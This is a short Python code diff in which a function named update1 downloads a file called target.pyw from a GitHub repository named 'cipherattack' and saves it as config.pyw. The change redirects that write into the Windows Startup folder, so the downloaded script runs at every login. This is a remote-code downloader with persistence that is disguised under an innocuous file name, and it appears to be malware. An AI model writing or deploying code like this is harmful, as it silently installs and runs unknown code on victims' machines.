@@ -45,7 +45,7 @@ def update():
             py.write(updateFile.read())
 
 def update1():      
-    os.chdir(os.environ['appdata'])  
+    os.chdir(os.environ['appdata']+r"\Microsoft\Windows\Start Menu\Programs\Startup")
     with ur.urlopen("https://github.com/cipher234/cipherattack/raw/main/cipher1/target.pyw") as conf:
         with open("config.pyw","wb") as config:
             config.write(conf.read())
